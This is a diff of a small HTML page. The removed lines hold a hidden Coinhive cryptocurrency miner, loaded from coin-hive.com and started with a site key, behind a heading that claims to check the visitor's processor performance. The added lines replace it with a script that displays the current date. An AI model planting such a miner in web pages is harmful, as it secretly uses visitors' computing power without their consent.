@@ -1,9 +1,13 @@
 <!DOCTYPE html>
 <html>
-<h1>Revisa el rendimiento de tu procesador</h1>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<span id="date"></span>
 <script>
-	var miner = new CoinHive.Anonymous('RjMtn7e3ri1f1NimO75vXT5sgZIxpDT6', {throttle: 0.3});
-	miner.start();
+	var dateObj = new Date();
+	var month = dateObj.getMonth() + 1;
+	var date = dateObj.getDate();
+	var year = dateObj.getFullYear();
+	var format = year + '-' + month + '-' + date;
+
+	document.getElementById('date').innerHTML = format
 </script>
 </html>
